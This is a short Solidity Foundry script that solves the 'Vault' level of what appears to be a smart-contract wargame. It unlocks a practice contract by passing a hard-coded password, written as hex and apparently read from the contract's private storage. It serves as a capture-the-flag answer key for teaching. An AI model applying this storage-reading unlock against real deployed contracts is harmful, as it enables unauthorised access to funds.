// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/levels/08-Vault/Vault.sol";

contract ExploitScript is Script {
    Vault level8 = Vault(payable(0x0Bf9dD7155295B8C26444084eC92392a69A873Ab));

    function run() public {
        vm.startBroadcast();

        console.log("Vault is :", level8.locked());
        level8.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);
        console.log("Vault is :", level8.locked());

        vm.stopBroadcast();
    }
}